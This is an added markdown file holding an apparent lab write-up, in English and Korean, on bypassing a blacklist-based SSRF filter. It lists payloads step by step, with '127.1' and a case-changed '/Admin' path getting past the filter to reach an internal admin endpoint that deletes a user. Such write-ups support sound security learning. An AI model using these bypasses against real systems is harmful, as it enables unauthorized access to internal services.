@@ -1,0 +1,24 @@
+#Lab: SSRF with blacklist-based input filter
+
+This lab has a stock check feature which fetches data from an internal system.
+To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and
+delete the user carlos. The developer has deployed two weak anti-SSRF defenses that you will need to bypass.
+
+### 🔍 분석 및 공격 과정
+1. localhost/admin API에 접근해 carlos를 delete하는게 목표. 그러나, 필터링이 적용되어 있음.
+2. 프록시 기능으로 stock을 조회하는 패킷 캡처. 
+3. stockAPI를 바꿔보자
+>>> stockAPI = http://localhost/admin
+ -> 필터링 작동.
+>>> stockAPI = http://localhost/
+ -> 필터링 작동. 따라서 localhost가 필터링되는중.
+>>> stockAPI = http://127.0.0.1/
+ -> 필터링 작동.
+>>> stockAPI = http://127.1/
+ -> 필터링 우회 성공
+>>> stockAPI = http://127.1/admin
+ -> 필터링 작동.
+>>> stockAPI = http://127.1/Admin
+ -> 우회 성공.
+4. 불러온 Admin API에서 carlos를 delete하는 API로 ssrf 시도.
+>>> stockAPI = http://127.1/Admin/delete?username=carlos -> solve
